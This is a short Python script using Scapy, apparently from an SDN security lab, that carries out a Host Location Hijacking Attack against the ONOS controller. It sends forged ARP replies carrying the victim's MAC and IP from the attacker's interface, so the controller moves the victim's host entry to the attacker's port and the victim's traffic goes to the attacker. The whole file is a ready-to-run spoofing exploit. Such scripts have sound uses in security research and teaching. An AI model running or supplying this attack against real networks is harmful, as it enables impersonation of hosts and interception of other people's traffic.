#!/usr/bin/env python3
"""
Host Location Hijacking Attack (HLHA) - one-shot
The attacker (atk) impersonates the victim (h1) by sending a packet
whose SOURCE is h1's MAC. ONOS trusts it and moves h1's host-table
entry to the attacker's port. Traffic for h1 is then sent to atk.
"""
from scapy.all import Ether, ARP, sendp

VICTIM_MAC     = "00:00:00:00:00:02"   # h1's MAC (verify in ONOS 'hosts')
VICTIM_IP      = "10.0.0.11"           # h1's IP (flat topology)
ATTACKER_IFACE = "atk-eth0"            # attacker's own port

pkt = Ether(src=VICTIM_MAC, dst="ff:ff:ff:ff:ff:ff") / \
      ARP(op=2, hwsrc=VICTIM_MAC, psrc=VICTIM_IP,
          hwdst="ff:ff:ff:ff:ff:ff", pdst=VICTIM_IP)

print(f"[*] Impersonating victim {VICTIM_IP} ({VICTIM_MAC}) out of {ATTACKER_IFACE}")
sendp(pkt, iface=ATTACKER_IFACE, count=5, inter=1, verbose=True)
print("[*] Done. Check ONOS 'hosts' - h1 should have moved to s3.")
